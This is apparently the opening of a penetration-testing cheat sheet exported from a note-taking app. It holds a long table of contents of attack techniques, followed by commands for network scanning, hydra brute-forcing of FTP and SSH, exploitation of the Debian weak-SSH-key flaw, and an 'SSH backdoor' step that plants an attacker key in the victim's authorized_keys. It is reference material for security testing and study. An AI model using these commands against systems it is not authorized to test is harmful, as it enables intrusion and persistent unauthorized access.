<li><a data-from-md title='#manual-exploit-1' href='#manual-exploit-1'>Manual exploit</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#rdp---3389' href='#rdp---3389'>RDP - 3389</a></p>
<ul>
<li><a data-from-md title='#brute-force' href='#brute-force'>Brute force</a></li>
<li><a data-from-md title='#connect-with-known-credentials--hash' href='#connect-with-known-credentials--hash'>Connect with known credentials / hash</a></li>
<li><a data-from-md title='#session-stealing' href='#session-stealing'>Session stealing</a>
<ul>
<li><a data-from-md title='#get-openned-sessions' href='#get-openned-sessions'>Get openned sessions</a></li>
<li><a data-from-md title='#access-to-the-selected' href='#access-to-the-selected'>Access to the selected</a></li>
</ul>
</li>
<li><a data-from-md title='#adding-user-to-rdp-group-windows' href='#adding-user-to-rdp-group-windows'>Adding user to RDP group (Windows)</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#vnc---5800---58001---5900---5901' href='#vnc---5800---58001---5900---5901'>VNC - 5800 - 58001 - 5900 - 5901</a></p>
<ul>
<li><a data-from-md title='#scans-1' href='#scans-1'>Scans</a></li>
<li><a data-from-md title='#brute-force-8' href='#brute-force-8'>Brute force</a></li>
<li><a data-from-md title='#connect-1' href='#connect-1'>Connect</a></li>
<li><a data-from-md title='#found-vnc-password' href='#found-vnc-password'>Found VNC password</a>
<ul>
<li><a data-from-md title='#linux' href='#linux'>Linux</a></li>
<li><a data-from-md title='#windows' href='#windows'>Windows</a></li>
</ul>
</li>
<li><a data-from-md title='#decrypt-vnc-password' href='#decrypt-vnc-password'>Decrypt VNC password</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#winrm---5985---5986' href='#winrm---5985---5986'>WINRM - 5985 - 5986</a></p>
<ul>
<li><a data-from-md title='#brute-force-9' href='#brute-force-9'>Brute force</a></li>
<li><a data-from-md title='#connecting' href='#connecting'>Connecting</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#cgi' href='#cgi'>CGI</a></p>
<ul>
<li><a data-from-md title='#found-cgi-scripts' href='#found-cgi-scripts'>Found CGI scripts</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#command-and-control-framework' href='#command-and-control-framework'>Command and control framework</a></p>
</li>
<li>
<p><a data-from-md title='#compiling-exploits' href='#compiling-exploits'>Compiling exploits</a></p>
<ul>
<li><a data-from-md title='#for-linux' href='#for-linux'>For linux</a></li>
<li><a data-from-md title='#for-windows' href='#for-windows'>For windows</a></li>
<li><a data-from-md title='#cross-compile' href='#cross-compile'>Cross compile</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#dictionary-generation' href='#dictionary-generation'>DICTIONARY GENERATION</a></p>
</li>
<li>
<p><a data-from-md title='#file-transfer' href='#file-transfer'>FILE TRANSFER</a></p>
<ul>
<li><a data-from-md title='#linux-1' href='#linux-1'>Linux</a></li>
<li><a data-from-md title='#windows-1' href='#windows-1'>Windows</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#git' href='#git'>GIT</a></p>
<ul>
<li><a data-from-md title='#download-git' href='#download-git'>Download .git</a></li>
<li><a data-from-md title='#extract-git-content' href='#extract-git-content'>Extract .git content</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#hashes' href='#hashes'>HASHES</a></p>
<ul>
<li><a data-from-md title='#pass-the-hash' href='#pass-the-hash'>Pass the hass</a></li>
</ul>
</li>
</ul>
<ul>
<li><a data-from-md title='#windows-2' href='#windows-2'>Windows</a></li>
<li><a data-from-md title='#linux-2' href='#linux-2'>Linux</a></li>
</ul>
<ul>
<li>
<p><a data-from-md title='#mimikatz' href='#mimikatz'>MIMIKATZ</a></p>
</li>
<li>
<p><a data-from-md title='#miscellaneous' href='#miscellaneous'>MISCELLANEOUS</a></p>
<ul>
<li><a data-from-md title='#get-a-windows-path-without-spaces' href='#get-a-windows-path-without-spaces'>Get a Windows path without spaces</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#msfvenom-payload' href='#msfvenom-payload'>MSFVENOM PAYLOAD</a></p>
<ul>
<li><a data-from-md title='#linux-3' href='#linux-3'>Linux</a></li>
<li><a data-from-md title='#windows-3' href='#windows-3'>Windows</a></li>
<li><a data-from-md title='#php' href='#php'>PHP</a></li>
<li><a data-from-md title='#asp' href='#asp'>ASP</a></li>
<li><a data-from-md title='#jsp' href='#jsp'>JSP</a></li>
<li><a data-from-md title='#war' href='#war'>WAR</a></li>
<li><a data-from-md title='#python' href='#python'>Python</a></li>
<li><a data-from-md title='#bash' href='#bash'>Bash</a></li>
<li><a data-from-md title='#perl' href='#perl'>Perl</a></li>
<li><a data-from-md title='#listener' href='#listener'>Listener</a>
<ul>
<li><a data-from-md title='#metasploit' href='#metasploit'>Metasploit</a></li>
<li><a data-from-md title='#netcat' href='#netcat'>Netcat</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p><a data-from-md title='#password-cracking' href='#password-cracking'>PASSWORD CRACKING</a></p>
<ul>
<li><a data-from-md title='#hydra' href='#hydra'>Hydra</a></li>
<li><a data-from-md title='#online' href='#online'>Online</a></li>
<li><a data-from-md title='#hashcat' href='#hashcat'>Hashcat</a>
<ul>
<li><a data-from-md title='#linux-password' href='#linux-password'>Linux password</a></li>
<li><a data-from-md title='#windows-password' href='#windows-password'>Windows password</a></li>
<li><a data-from-md title='#others' href='#others'>Others</a></li>
<li><a data-from-md title='#rules' href='#rules'>Rules</a></li>
</ul>
</li>
<li><a data-from-md title='#john' href='#john'>John</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#pivoting' href='#pivoting'>PIVOTING</a></p>
<ul>
<li><a data-from-md title='#sshuttle' href='#sshuttle'>Sshuttle</a></li>
<li><a data-from-md title='#proxychains' href='#proxychains'>Proxychains</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#privile-escalation' href='#privile-escalation'>PRIVILE ESCALATION</a></p>
<ul>
<li><a data-from-md title='#linux-4' href='#linux-4'>Linux</a>
<ul>
<li><a data-from-md title='#enumeration-scripts' href='#enumeration-scripts'>Enumeration scripts</a></li>
</ul>
<ul>
<li><a data-from-md title='#vulnerability-scan' href='#vulnerability-scan'>Vulnerability scan</a></li>
<li><a data-from-md title='#suid-checker' href='#suid-checker'>Suid checker</a></li>
<li><a data-from-md title='#methodology-to-follow' href='#methodology-to-follow'>Methodology to follow</a></li>
</ul>
</li>
<li><a data-from-md title='#windows-4' href='#windows-4'>Windows</a>
<ul>
<li><a data-from-md title='#enumeration-scripts-1' href='#enumeration-scripts-1'>Enumeration scripts</a>
<ul>
<li><a data-from-md title='#general-scans' href='#general-scans'>General scans</a></li>
<li><a data-from-md title='#search-for-cve' href='#search-for-cve'>Search for CVE</a></li>
<li><a data-from-md title='#post-exploitation' href='#post-exploitation'>Post exploitation</a></li>
</ul>
</li>
<li><a data-from-md title='#juicypotato-seimpersonate-or-seassignprimarytoken' href='#juicypotato-seimpersonate-or-seassignprimarytoken'>JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</a></li>
</ul>
<ul>
<li><a data-from-md title='#methodology-to-follow-1' href='#methodology-to-follow-1'>Methodology to follow</a></li>
<li><a data-from-md title='#autorun' href='#autorun'>Autorun</a>
<ul>
<li><a data-from-md title='#detection' href='#detection'>Detection</a></li>
<li><a data-from-md title='#exploitation' href='#exploitation'>Exploitation</a></li>
</ul>
</li>
<li><a data-from-md title='#alwaysinstallelevated' href='#alwaysinstallelevated'>AlwaysInstallElevated</a>
<ul>
<li><a data-from-md title='#detection-1' href='#detection-1'>Detection</a></li>
<li><a data-from-md title='#exploitation-1' href='#exploitation-1'>Exploitation</a></li>
</ul>
</li>
<li><a data-from-md title='#executable-files' href='#executable-files'>Executable Files</a>
<ul>
<li><a data-from-md title='#detection-2' href='#detection-2'>Detection</a></li>
<li><a data-from-md title='#exploitation-2' href='#exploitation-2'>Exploitation</a></li>
</ul>
</li>
<li><a data-from-md title='#startup-applications' href='#startup-applications'>Startup applications</a>
<ul>
<li><a data-from-md title='#detection-3' href='#detection-3'>Detection</a></li>
<li><a data-from-md title='#exploitation-3' href='#exploitation-3'>Exploitation</a></li>
</ul>
</li>
<li><a data-from-md title='#weak-service-permission' href='#weak-service-permission'>Weak service permission</a>
<ul>
<li><a data-from-md title='#detection-4' href='#detection-4'>Detection</a></li>
<li><a data-from-md title='#exploitation-4' href='#exploitation-4'>Exploitation</a></li>
</ul>
</li>
<li><a data-from-md title='#unquoted-service-paths' href='#unquoted-service-paths'>Unquoted service paths</a>
<ul>
<li><a data-from-md title='#detection-5' href='#detection-5'>Detection</a></li>
<li><a data-from-md title='#exploitation-5' href='#exploitation-5'>Exploitation</a></li>
</ul>
</li>
<li><a data-from-md title='#hot-potato' href='#hot-potato'>Hot potato</a>
<ul>
<li><a data-from-md title='#exploitation-6' href='#exploitation-6'>Exploitation</a></li>
</ul>
</li>
<li><a data-from-md title='#cve' href='#cve'>CVE</a>
<ul>
<li><a data-from-md title='#windows-xp' href='#windows-xp'>Windows XP</a></li>
<li><a data-from-md title='#windows-7' href='#windows-7'>Windows 7</a></li>
<li><a data-from-md title='#windows-8' href='#windows-8'>Windows 8</a></li>
<li><a data-from-md title='#windows-10' href='#windows-10'>Windows 10</a></li>
<li><a data-from-md title='#windows-server-2003' href='#windows-server-2003'>Windows Server 2003</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><a data-from-md title='#proofs' href='#proofs'>PROOFS</a></p>
<ul>
<li><a data-from-md title='#linux-5' href='#linux-5'>Linux</a></li>
<li><a data-from-md title='#windows-5' href='#windows-5'>Windows</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#reverse-shell' href='#reverse-shell'>REVERSE SHELL</a></p>
<ul>
<li><a data-from-md title='#amazing-tool-for-shell-generation' href='#amazing-tool-for-shell-generation'>Amazing tool for shell generation</a></li>
<li><a data-from-md title='#bash-1' href='#bash-1'>Bash</a></li>
<li><a data-from-md title='#perl-1' href='#perl-1'>Perl</a></li>
<li><a data-from-md title='#python-1' href='#python-1'>Python</a></li>
<li><a data-from-md title='#netcat-1' href='#netcat-1'>Netcat</a></li>
<li><a data-from-md title='#more-reverse-shell' href='#more-reverse-shell'>More reverse shell</a></li>
<li><a data-from-md title='#interactive-shell' href='#interactive-shell'>Interactive shell</a></li>
<li><a data-from-md title='#adjust-interactive-shell' href='#adjust-interactive-shell'>Adjust Interactive shell</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#shellshock' href='#shellshock'>SHELLSHOCK</a></p>
</li>
<li>
<p><a data-from-md title='#useful-linux-commands' href='#useful-linux-commands'>USEFUL LINUX COMMANDS</a></p>
<ul>
<li><a data-from-md title='#find-a-file' href='#find-a-file'>Find a file</a></li>
<li><a data-from-md title='#active-connection' href='#active-connection'>Active connection</a></li>
<li><a data-from-md title='#list-all-suid-files' href='#list-all-suid-files'>List all SUID files</a></li>
<li><a data-from-md title='#determine-the-current-version-of-linux' href='#determine-the-current-version-of-linux'>Determine the current version of Linux</a></li>
<li><a data-from-md title='#determine-more-information-about-the-environment' href='#determine-more-information-about-the-environment'>Determine more information about the environment</a></li>
<li><a data-from-md title='#list-processes-running' href='#list-processes-running'>List processes running</a></li>
<li><a data-from-md title='#list-the-allowed-and-forbidden-commands-for-the-invoking-use' href='#list-the-allowed-and-forbidden-commands-for-the-invoking-use'>List the allowed (and forbidden) commands for the invoking use</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#useful-windows-commands' href='#useful-windows-commands'>USEFUL WINDOWS COMMANDS</a></p>
</li>
<li>
<p><a data-from-md title='#lateral-movement' href='#lateral-movement'>Lateral Movement</a></p>
</li>
<li>
<p><a data-from-md title='#active-directory-exploitation-cheat-sheet' href='#active-directory-exploitation-cheat-sheet'>Active Directory Exploitation Cheat Sheet</a></p>
<ul>
<li><a data-from-md title='#summary' href='#summary'>Summary</a></li>
<li><a data-from-md title='#tools' href='#tools'>Tools</a></li>
<li><a data-from-md title='#domain-enumeration' href='#domain-enumeration'>Domain Enumeration</a>
<ul>
<li><a data-from-md title='#using-powerview' href='#using-powerview'>Using PowerView</a></li>
<li><a data-from-md title='#using-ad-module' href='#using-ad-module'>Using AD Module</a></li>
<li><a data-from-md title='#using-bloodhound' href='#using-bloodhound'>Using BloodHound</a>
<ul>
<li><a data-from-md title='#remote-bloodhound' href='#remote-bloodhound'>Remote BloodHound</a></li>
<li><a data-from-md title='#on-site-bloodhound' href='#on-site-bloodhound'>On Site BloodHound</a></li>
</ul>
</li>
<li><a data-from-md title='#using-adalanche' href='#using-adalanche'>Using Adalanche</a>
<ul>
<li><a data-from-md title='#remote-adalanche' href='#remote-adalanche'>Remote adalanche</a></li>
</ul>
</li>
<li><a data-from-md title='#useful-enumeration-tools' href='#useful-enumeration-tools'>Useful Enumeration Tools</a></li>
</ul>
</li>
<li><a data-from-md title='#local-privilege-escalation' href='#local-privilege-escalation'>Local Privilege Escalation</a>
<ul>
<li><a data-from-md title='#useful-local-priv-esc-tools' href='#useful-local-priv-esc-tools'>Useful Local Priv Esc Tools</a></li>
</ul>
</li>
<li><a data-from-md title='#lateral-movement' href='#lateral-movement'>Lateral Movement</a>
<ul>
<li><a data-from-md title='#powershell-remoting' href='#powershell-remoting'>Powershell Remoting</a></li>
<li><a data-from-md title='#remote-code-execution-with-ps-credentials' href='#remote-code-execution-with-ps-credentials'>Remote Code Execution with PS Credentials</a></li>
<li><a data-from-md title='#import-a-powershell-module-and-execute-its-functions-remotely' href='#import-a-powershell-module-and-execute-its-functions-remotely'>Import a PowerShell Module and Execute its Functions Remotely</a></li>
<li><a data-from-md title='#executing-remote-stateful-commands' href='#executing-remote-stateful-commands'>Executing Remote Stateful commands</a></li>
<li><a data-from-md title='#mimikatz' href='#mimikatz'>Mimikatz</a></li>
<li><a data-from-md title='#remote-desktop-protocol' href='#remote-desktop-protocol'>Remote Desktop Protocol</a></li>
<li><a data-from-md title='#url-file-attacks' href='#url-file-attacks'>URL File Attacks</a></li>
<li><a data-from-md title='#useful-tools' href='#useful-tools'>Useful Tools</a></li>
</ul>
</li>
<li><a data-from-md title='#domain-privilege-escalation' href='#domain-privilege-escalation'>Domain Privilege Escalation</a>
<ul>
<li><a data-from-md title='#kerberoast' href='#kerberoast'>Kerberoast</a></li>
<li><a data-from-md title='#asreproast' href='#asreproast'>ASREPRoast</a></li>
<li><a data-from-md title='#password-spray-attack' href='#password-spray-attack'>Password Spray Attack</a></li>
<li><a data-from-md title='#force-set-spn' href='#force-set-spn'>Force Set SPN</a></li>
<li><a data-from-md title='#abusing-shadow-copies' href='#abusing-shadow-copies'>Abusing Shadow Copies</a></li>
<li><a data-from-md title='#list-and-decrypt-stored-credentials-using-mimikatz' href='#list-and-decrypt-stored-credentials-using-mimikatz'>List and Decrypt Stored Credentials using Mimikatz</a></li>
<li><a data-from-md title='#unconstrained-delegation' href='#unconstrained-delegation'>Unconstrained Delegation</a></li>
<li><a data-from-md title='#constrained-delegation' href='#constrained-delegation'>Constrained Delegation</a></li>
<li><a data-from-md title='#resource-based-constrained-delegation' href='#resource-based-constrained-delegation'>Resource Based Constrained Delegation</a></li>
<li><a data-from-md title='#dnsadmins-abuse' href='#dnsadmins-abuse'>DNSAdmins Abuse</a></li>
<li><a data-from-md title='#abusing-active-directory-integraded-dns' href='#abusing-active-directory-integraded-dns'>Abusing Active Directory-Integraded DNS</a></li>
<li><a data-from-md title='#abusing-backup-operators-group' href='#abusing-backup-operators-group'>Abusing Backup Operators Group</a></li>
<li><a data-from-md title='#abusing-exchange' href='#abusing-exchange'>Abusing Exchange</a></li>
<li><a data-from-md title='#weaponizing-printer-bug' href='#weaponizing-printer-bug'>Weaponizing Printer Bug</a></li>
<li><a data-from-md title='#abusing-acls' href='#abusing-acls'>Abusing ACLs</a></li>
<li><a data-from-md title='#abusing-ipv6-with-mitm6' href='#abusing-ipv6-with-mitm6'>Abusing IPv6 with mitm6</a></li>
<li><a data-from-md title='#sid-history-abuse' href='#sid-history-abuse'>SID History Abuse</a></li>
<li><a data-from-md title='#exploiting-sharepoint' href='#exploiting-sharepoint'>Exploiting SharePoint</a></li>
<li><a data-from-md title='#zerologon' href='#zerologon'>Zerologon</a></li>
<li><a data-from-md title='#printnightmare' href='#printnightmare'>PrintNightmare</a></li>
<li><a data-from-md title='#active-directory-certificate-services' href='#active-directory-certificate-services'>Active Directory Certificate Services</a></li>
<li><a data-from-md title='#no-pac' href='#no-pac'>No PAC</a></li>
</ul>
</li>
<li><a data-from-md title='#domain-persistence' href='#domain-persistence'>Domain Persistence</a>
<ul>
<li><a data-from-md title='#golden-ticket-attack' href='#golden-ticket-attack'>Golden Ticket Attack</a></li>
<li><a data-from-md title='#dcsync-attack' href='#dcsync-attack'>DCsync Attack</a></li>
<li><a data-from-md title='#silver-ticket-attack' href='#silver-ticket-attack'>Silver Ticket Attack</a></li>
<li><a data-from-md title='#skeleton-key-attack' href='#skeleton-key-attack'>Skeleton Key Attack</a></li>
<li><a data-from-md title='#dsrm-abuse' href='#dsrm-abuse'>DSRM Abuse</a></li>
<li><a data-from-md title='#custom-ssp' href='#custom-ssp'>Custom SSP</a></li>
</ul>
</li>
<li><a data-from-md title='#cross-forest-attacks' href='#cross-forest-attacks'>Cross Forest Attacks</a>
<ul>
<li><a data-from-md title='#trust-tickets' href='#trust-tickets'>Trust Tickets</a></li>
<li><a data-from-md title='#abuse-mssql-servers' href='#abuse-mssql-servers'>Abuse MSSQL Servers</a></li>
<li><a data-from-md title='#breaking-forest-trusts' href='#breaking-forest-trusts'>Breaking Forest Trusts</a></li>
<li><a data-from-md title='#AD_Mindmap' href='#AD_Mindmap'>MindMap</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p><a data-from-md title='#zip' href='#zip'>ZIP</a></p>
</li>
</ul>
<hr>
<h2 id="enumeration">Enumeration</h2>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">nmap -sn -v &lt;IP&gt;/CIDR</pre><pre class="hljs"><code><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> -v <span class="hljs-symbol">&lt;IP&gt;</span>/CIDR</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">nmapAutomator &lt;IP&gt; All</pre><pre class="hljs"><code>nmapAutomator &lt;IP&gt; <span class="hljs-keyword">All</span></code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">autorecon &lt;IP&gt;/CIDR</pre><pre class="hljs"><code><span class="hljs-built_in">auto</span>recon &lt;IP&gt;/CIDR</code></pre></div>
<hr>
<h2 id="nmap">NMAP</h2>
<h3 id="tcp">TCP</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">sudo -sS -sC -sV -oA &lt;NAME&gt;.tcp &lt;IP&gt; -v</pre><pre class="hljs"><code>sudo -sS -sC -sV -oA <span class="hljs-tag">&lt;<span class="hljs-name">NAME</span>&gt;</span>.tcp <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -v</code></pre></div>
<h3 id="udp">UDP</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">sudo -sU -sS -sC -sV -oA &lt;NAME&gt;.udp &lt;IP&gt; -v</pre><pre class="hljs"><code>sudo -sU -sS -sC -sV -oA <span class="hljs-tag">&lt;<span class="hljs-name">NAME</span>&gt;</span>.udp <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -v</code></pre></div>
<hr>
<h2 id="autorecon">AUTORECON</h2>
<h3 id="general-use">General use</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">sudo autorecon &lt;HOST&gt; --nmap-append sVC --heartbeat 10 --dirbuster.tool gobuster --dirbuster.wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --dirbuster.ext txt,html,php,sh,asp,aspx,jsp -v
#nmap-append adds to default without changing. 
#sVC Version and default scripts 
#heartbeat - update rate (s)
#dirbuster.tol Sets tool to gobuster
#dirbuster.wordlist sets Wordlist for fuzz
#dirbuster.ext extensions to search for</pre><pre class="hljs"><code>sudo autorecon &lt;HOST&gt; <span class="hljs-attr">--nmap-append</span> sVC <span class="hljs-attr">--heartbeat</span> <span class="hljs-number">10</span> <span class="hljs-attr">--dirbuster</span><span class="hljs-selector-class">.tool</span> gobuster <span class="hljs-attr">--dirbuster</span><span class="hljs-selector-class">.wordlist</span> /usr/share/wordlists/dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--dirbuster</span><span class="hljs-selector-class">.ext</span> txt,<span class="hljs-selector-tag">html</span>,php,sh,asp,aspx,jsp -v
<span class="hljs-selector-id">#nmap-append</span> adds to default without changing. 
<span class="hljs-selector-id">#sVC</span> Version and default scripts 
<span class="hljs-selector-id">#heartbeat</span> - update rate (s)
<span class="hljs-selector-id">#dirbuster</span><span class="hljs-selector-class">.tol</span> Sets tool to gobuster
<span class="hljs-selector-id">#dirbuster</span><span class="hljs-selector-class">.wordlist</span> sets Wordlist <span class="hljs-keyword">for</span> fuzz
<span class="hljs-selector-id">#dirbuster</span><span class="hljs-selector-class">.ext</span> extensions to search <span class="hljs-keyword">for</span></code></pre></div>
<hr>
<h2 id="ftp-21">FTP - 21</h2>
<h3 id="brute-force">Brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; ftp://&lt;IP&gt; -u -vV</pre><pre class="hljs"><code>hydra -V -f -L <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> -P <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span> ftp://<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -u -vV</code></pre></div>
<h3 id="downloading-file">Downloading file</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">ftp &lt;IP&gt;
PASSIVE
BINARY
get &lt;FILE&gt;</pre><pre class="hljs"><code>ftp <span class="hljs-symbol">&lt;IP&gt;</span>
PASSIVE
BINARY
<span class="hljs-built_in">get</span> <span class="hljs-symbol">&lt;FILE&gt;</span></code></pre></div>
<h3 id="uploading-file">Uploading file</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">ftp &lt;IP&gt;
PASSIVE
BINARY
put &lt;FILE&gt;</pre><pre class="hljs"><code>ftp &lt;IP&gt;
PASSIVE
<span class="hljs-keyword">BINARY</span>
<span class="hljs-keyword">put</span> &lt;<span class="hljs-keyword">FILE</span>&gt;</code></pre></div>
<hr>
<h2 id="ssh-22">SSH - 22</h2>
<h3 id="brute-force-2">Brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; ssh://&lt;IP&gt; -u -vV</pre><pre class="hljs"><code>hydra -V -f -L <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> -P <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span> ssh://<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -u -vV</code></pre></div>
<h3 id="cve-2008-0166">CVE-2008-0166</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

https://www.exploit-db.com/exploits/5720

wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2

bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
tar -xvf debian_ssh_dsa_1024_x86.tar

python 5720 rsa/2048 &lt;IP&gt; &lt;USER&gt; &lt;PORT&gt; &lt;THREADS&gt;
python 5720 dsa/1024 &lt;IP&gt; &lt;USER&gt; &lt;PORT&gt; &lt;THREADS&gt;</pre><pre class="hljs"><code>All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September <span class="hljs-number">2006</span> and May <span class="hljs-number">13</span>th, <span class="hljs-number">2008</span> may be affected.

https:<span class="hljs-regexp">//</span>www.exploit-db.com<span class="hljs-regexp">/exploits/</span><span class="hljs-number">5720</span>

wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/g0tmi1k/</span>debian-ssh<span class="hljs-regexp">/raw/m</span>aster<span class="hljs-regexp">/common_keys/</span>debian_ssh_rsa_2048_x86.tar.bz2 https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/g0tmi1k/</span>debian-ssh<span class="hljs-regexp">/raw/m</span>aster<span class="hljs-regexp">/common_keys/</span>debian_ssh_dsa_1024_x86.tar.bz2

bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
tar -xvf debian_ssh_dsa_1024_x86.tar

python <span class="hljs-number">5720</span> rsa/<span class="hljs-number">2048</span> &lt;IP&gt; &lt;USER&gt; &lt;PORT&gt; &lt;THREADS&gt;
python <span class="hljs-number">5720</span> dsa/<span class="hljs-number">1024</span> &lt;IP&gt; &lt;USER&gt; &lt;PORT&gt; &lt;THREADS&gt;</code></pre></div>
<h3 id="ssh-backdoor-post-exploitation">SSH backdoor - post exploitation</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Attacker
ssh-keygen -f &lt;FILENAME&gt;
chmod 600 &lt;FILENAME&gt;
cat &lt;FILENAME&gt;.pub -&gt; copy

# Victim
echo &lt;FILENAME&gt;.pub &gt;&gt; &lt;PATH&gt;/.ssh/authorized_keys

# Connect
ssh -i &lt;FILENAME&gt; &lt;USER&gt;@&lt;IP&gt;</pre><pre class="hljs"><code><span class="hljs-comment"># Attacker</span>
ssh-keygen -f <span class="hljs-variable">&lt;FILENAME&gt;</span>
chmod 600 <span class="hljs-variable">&lt;FILENAME&gt;</span>
cat <span class="hljs-variable">&lt;FILENAME&gt;</span>.pub -&gt; copy

<span class="hljs-comment"># Victim</span>
echo <span class="hljs-variable">&lt;FILENAME&gt;</span>.pub &gt;&gt; <span class="hljs-variable">&lt;PATH&gt;</span>/.ssh/authorized_keys

<span class="hljs-comment"># Connect</span>
ssh -i <span class="hljs-variable">&lt;FILENAME&gt;</span> <span class="hljs-variable">&lt;USER&gt;</span><span class="hljs-meta">@&lt;IP&gt;</span></code></pre></div>
<hr>
<h2 id="dns-53">DNS - 53</h2>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">dnsenum &lt;DOMAIN&gt;</pre><pre class="hljs"><code>dnsenum <span class="hljs-tag">&lt;<span class="hljs-name">DOMAIN</span>&gt;</span></code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">dnsrecon -d &lt;DOMAIN&gt;</pre><pre class="hljs"><code>dnsrecon -d <span class="hljs-tag">&lt;<span class="hljs-name">DOMAIN</span>&gt;</span></code></pre></div>
<h3 id="zone-transfert">Zone transfert</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">dnsrecon -d &lt;DOMAIN&gt; -a
dig axfr &lt;DOMAIN&gt; @ns1.test.com</pre><pre class="hljs"><code>dnsrecon -d <span class="hljs-symbol">&lt;DOMAIN&gt;</span> -<span class="hljs-keyword">a</span>
<span class="hljs-keyword">dig</span> axfr <span class="hljs-symbol">&lt;DOMAIN&gt;</span> @ns1.test.<span class="hljs-keyword">com</span></code></pre></div>
<h3 id="dns-brute-force">DNS brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/blark/aiodnsbrute</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/blark/</span>aiodnsbrute</code></pre></div>
<hr>
<h2 id="finger-79">FINGER - 79</h2>
<h3 id="user-enumeration">User enumeration</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">finger @&lt;IP&gt;
finger &lt;USER&gt;@&lt;IP&gt;</pre><pre class="hljs"><code>finger @<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>
finger <span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span>@<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span></code></pre></div>
<h3 id="command-execution">Command execution</h3>
